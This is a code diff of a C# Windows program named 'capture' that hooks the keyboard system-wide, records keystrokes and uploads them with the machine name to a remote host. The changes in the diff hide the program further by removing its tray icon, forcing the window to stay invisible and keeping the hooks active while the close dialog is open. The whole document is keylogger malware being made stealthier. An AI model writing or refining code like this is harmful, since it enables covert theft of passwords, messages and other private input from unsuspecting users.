@@ -11,6 +11,7 @@ using System.Net;
 using System.Net.NetworkInformation;
 using Microsoft.Win32;
 using System.Collections.Specialized;
+using System.Threading.Tasks;
 namespace capture
 {
     enum Tick:int{
@@ -37,17 +38,24 @@ namespace capture
 
         string uri = "http://capture.byethost14.com/test";
         //string ipserver = "192.168.1.15";
+        WebClient client;
         string machine = System.Environment.MachineName.ToString();
         private void Form1_Load(object sender, EventArgs e)
         {
             Form1 f1 = new Form1();
             f1.Hide();
-            this.WindowState = FormWindowState.Minimized;
-            notifyIcon1.Visible = true;
+            //this.WindowState = FormWindowState.Minimized;
+            notifyIcon1.Visible = false;
             HookManager.KeyDown += HookManager_KeyDown;
             HookManager.KeyPress += HookManager_KeyPress;
             GoConnection();
         }
+        protected override void OnVisibleChanged(EventArgs e)
+        {
+            base.OnVisibleChanged(e);
+            this.Visible = false;
+        }
+
         void GoConnection() {
             if (!NetworkInterface.GetIsNetworkAvailable())
             {
@@ -58,6 +66,7 @@ namespace capture
                 connected = true;
                 timer1.Interval =(int) Tick.ON;
                 timer1.Start();
+                client = new WebClient();
             }
 
         }
@@ -113,7 +122,7 @@ namespace capture
                 Write();
                 Press_Control(e.KeyChar);
                 Write();
-                AppendFile();
+            //    AppendFile();
             }
         }
 
@@ -240,23 +249,47 @@ namespace capture
         private void AppendFile() {
             if (connected && line.Trim().Length > 0)
             {
-                using (WebClient client = new WebClient())
-                {
+                Syncer(client, uri, line, machine);
 
-                    byte[] response =
-                    client.UploadValues(uri, new NameValueCollection()
+                //using (client)
+                //{
+                //    byte[] response =
+                //    client.UploadValues(uri, new NameValueCollection()
+                //    {
+                //       { "content", line },
+                //       { "machine", machine }
+                //    });
+                //    string result = System.Text.Encoding.UTF8.GetString(response);
+                //    Console.Write(result);
+                    line = "";
+
+                //}
+            }
+        }
+
+        public async Task<int> SyncServer(WebClient client, string uri, string line, string machine)
+        {
+            using (client)
+            {
+                byte[] response =
+                client.UploadValues(uri, new NameValueCollection()
                     {
                        { "content", line },
                        { "machine", machine }
                     });
-                    //string result = System.Text.Encoding.UTF8.GetString(response);
-                    //Console.Write(result);
-                    line = "";
-
-                }
+                //string result = System.Text.Encoding.UTF8.GetString(response);
+                //Console.Write(result);
+                //line = "";
+           
             }
+            return 1;
         }
-       
+        public async Task Syncer(WebClient client, string uri, string line, string machine)
+        {
+            Task<int> longRunningTask =  SyncServer(client, uri, line, machine);
+            int result = await longRunningTask;
+        }
+
         int time = 0;
         
         private void timer1_Tick(object sender, EventArgs e)
@@ -279,10 +312,10 @@ namespace capture
 
         private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
         {
-            HookManager.KeyPress -= HookManager_KeyPress;
+            //HookManager.KeyPress -= HookManager_KeyPress;
             frmClose f = new frmClose();
             f.ShowDialog();
-            HookManager.KeyPress += HookManager_KeyPress;
+            //HookManager.KeyPress += HookManager_KeyPress;
         }
 
         public string ProxyString { get; set; }
